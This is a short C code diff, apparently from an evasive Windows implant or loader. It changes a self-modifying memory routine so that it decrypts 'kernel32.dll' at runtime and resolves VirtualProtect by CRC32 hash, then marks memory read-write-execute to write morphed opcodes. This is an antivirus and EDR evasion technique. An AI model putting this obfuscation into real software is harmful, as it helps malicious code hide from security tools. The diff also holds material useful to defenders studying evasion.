@@ -160,12 +160,28 @@ VOID morphMemory(UCHAR* pbyDst, UCHAR byLength){
 
 #else
 
-    check_debug(VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect) != 0, "VirtualProtect (RWX) Failed!");
+#if CONFIG_OBFUSCATION // obfuscation
+    UCHAR s_string[] = S_KERNEL32;
+    UCHAR d_string[13] = {0};
+
+    UCHAR s_xk[] = S_XK;
+
+    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
+
+#else // not obfuscated
+
+    UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};
+
+#endif
+    VirtualProtect_t p_VirtualProtect =
+            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle((LPCSTR) d_string), VirtualProtect_CRC32B);
+
+    check_debug(p_VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect) != 0, "VirtualProtect (RWX) Failed!");
 
     mem_cpy((VOID *) pbyDst,  (VOID *) morphedOpcodes, (size_t) byLength);
 
     // Restore the original memory protection
-    check_debug(VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect) != 0, "VirtualProtect (RX) Failed!");
+    check_debug(p_VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect) != 0, "VirtualProtect (RX) Failed!");
 
 #endif //CONFIG NATIVE
     LEAVE:
